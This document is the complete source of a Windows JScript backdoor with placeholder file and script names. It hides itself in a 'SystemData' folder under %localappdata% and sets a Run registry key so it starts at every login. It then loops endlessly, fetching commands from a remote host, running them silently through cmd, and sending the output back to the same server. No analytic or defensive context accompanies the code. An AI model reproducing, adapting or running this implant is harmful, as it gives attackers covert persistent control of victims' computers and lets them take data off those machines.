var shell = WScript.CreateObject("WScript.Shell");
var fs = WScript.CreateObject("Scripting.FileSystemObject");
var temp = shell.ExpandEnvironmentStrings("%temp%");
var appdata = shell.ExpandEnvironmentStrings("%localappdata%");
var fileName = "##FILE##";
var scriptName = "##SCRIPT_NAME##.js";

if(!fs.FolderExists(appdata+"\\SystemData")){
	fs.CreateFolder(appdata+"\\SystemData");
	fs.CopyFile(WScript.ScriptFullName, appdata+"\\SystemData\\"+scriptName);
	shell.Run('attrib +h "%localappdata%\\SystemData"', 0);
	shell.Run('attrib +h "%localappdata%\\SystemData\\'+scriptName+'"', 0);
}

if(!regCheck("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"+scriptName.replace(".js", ""))){
	shell.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"+scriptName.replace(".js", ""), '"'+appdata+"\\SystemData\\"+scriptName+'"', "REG_SZ");
}

function regCheck(path){
	var r = false;
	try{
		shell.RegRead(path);
		r = true;
	}catch(e){}
	
	return r;
}

function get(url){
	var ie = WScript.CreateObject("InternetExplorer.Application");
	ie.Navigate(url+((url.indexOf("?")>0)?"&":"?")+"r="+Math.floor(Math.random()+999999));
	while(ie.ReadyState < 4) WScript.Sleep(100);
	var d = ie.Document;
	var text = ""+d.body.innerText;
	ie.Quit();
	return text;
}

function readFile(path){
	var text = "";
	try{
		var f = fs.OpenTextFile(path, 1);
		text = f.ReadAll();
		f.Close();
	}catch(e){}
	return text;
}

while(true){
	var text = get("http://yfiles.22web.org/RemoteCMD/"+fileName+".txt");
	
	
	if(text.length > 0 && (text.indexOf("cmd:")>-1)){
		text = text.replace("cmd:", "");
		
		if(text == "script_not_runned"){
			get("http://yfiles.22web.org/RemoteCMD/write.php?name="+fileName+".txt&data=script_runned");
			continue;
		}
		try{
			if(fs.FileExists(appdata+"\\SystemData\\cmd.log")) fs.DeleteFile(appdata+"\\SystemData\\cmd.log");
			shell.Run('cmd /c "'+text+' > %localappdata%\\SystemData\\cmd.log"', 0);
		}catch(e){
			continue;
		}
		while(!fs.FileExists(appdata+"\\SystemData\\cmd.log")) WScript.Sleep(50);
		get("http://yfiles.22web.org/RemoteCMD/write.php?name="+fileName+".txt&data="+readFile(appdata+"\\SystemData\\cmd.log"));
	}

	WScript.Sleep(3000);
}